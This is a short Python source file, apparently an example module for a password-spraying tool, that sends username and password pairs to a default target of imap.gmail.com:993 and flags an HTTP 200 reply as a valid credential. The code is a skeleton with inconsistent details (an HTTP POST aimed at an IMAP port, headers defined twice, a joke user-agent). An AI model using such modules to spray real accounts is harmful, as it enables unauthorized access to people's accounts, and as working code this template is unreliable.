from .base import BaseSprayModule

class SprayModule(BaseSprayModule):

    # HTTP method
    method = 'POST'
    # default target URL
    default_url = 'imap.gmail.com:993'
    # body of request
    request_data = { 
        "username": "{username}",
        "password": "{password}",
    }
    # HTTP headers
    headers = {}
    # HTTP cookies
    cookies = {}
    # Don't count nonexistent accounts as failed logons
    fail_nonexistent = False

    headers = {
        'User-Agent': 'Your Moms Smart Vibrator',
    }

    def initialize(self):
        '''
        Get additional arguments from user at runtime
        NOTE: These can also be passed via environment variables beginning with "TREVOR_":
            TREVOR_otherthing=asdf
        '''
        while not self.trevor.runtimeparams.get('otherthing', ''):
            self.trevor.runtimeparams.update({
                'otherthing': input("What's that other thing? ")
            })

        return True


    def check_response(self, response):
        '''
        returns (valid, exists, locked, msg)
        '''

        valid = False
        exists = None
        locked = None
        msg = ''

        if getattr(response, 'status_code', 0) == 200:
            valid = True
            exists = True
            msg = 'Valid cred'

        return (valid, exists, locked, msg)
